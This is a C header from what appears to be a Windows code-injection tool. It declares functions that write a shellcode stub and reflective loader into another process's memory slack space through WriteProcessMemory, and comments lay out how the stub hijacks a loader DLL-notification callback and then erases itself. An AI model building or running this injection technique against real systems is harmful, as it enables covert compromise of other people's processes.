/*
 * src/stub/siren_stub.h
 *
 * Stub blob serializer.
 *
 * The "stub blob" written into the target's section slack space is:
 *
 *   [ PIC stub shellcode     ]  ← SIREN_STUB_CODE_OFFSET = 0
 *   [ reflective loader copy ]
 *   [ LDR_DLL_NOTIFY_ENTRY   ]  ← SIREN_STUB_ENTRY_OFFSET
 *
 * The stub shellcode is the notification callback.  When the Windows
 * loader fires it, the stub:
 *   1. Opens the pagefile section (handle from entry->Context)
 *   2. Maps it (NtMapViewOfSection)
 *   3. Calls the embedded reflective loader
 *   4. Closes the section handle
 *   5. Zeroes entry->Callback (NOP-self) so it never fires again
 *   6. Returns
 */

#ifndef SIREN_STUB_H
#define SIREN_STUB_H

#include "siren/siren_status.h"
#include "siren/siren_types.h"

#include <stddef.h>
#include <windows.h>

#ifdef __cplusplus
extern "C" {
#endif

/*
 * siren_stub_total_size
 *
 * Returns the total number of bytes that siren_stub_write will consume
 * from the slack region.  Includes code + entry struct.
 */
size_t siren_stub_total_size(void);

/*
 * siren_stub_entry_offset
 *
 * Returns the byte offset from the start of the blob to the
 * siren_ldr_notify_entry structure.  Used by siren_api.c to pass
 * entry_addr to siren_notify_insert.
 */
size_t siren_stub_entry_offset(void);

/*
 * siren_stub_write
 *
 * Serialise the stub blob into the target's slack space:
 *   1. Builds the blob in a local buffer (code + entry)
 *   2. Patches the entry->Callback to point at slack_addr (the blob start)
 *   3. Patches the entry->Context to section_handle
 *   4. WriteProcessMemory to slack_addr
 *
 * slack_size must be >= siren_stub_total_size().
 */
siren_status_t siren_stub_write(HANDLE  hProcess,
                                void   *slack_addr,
                                size_t  slack_size,
                                HANDLE  section_handle);

#ifdef __cplusplus
}
#endif

#endif /* SIREN_STUB_H */
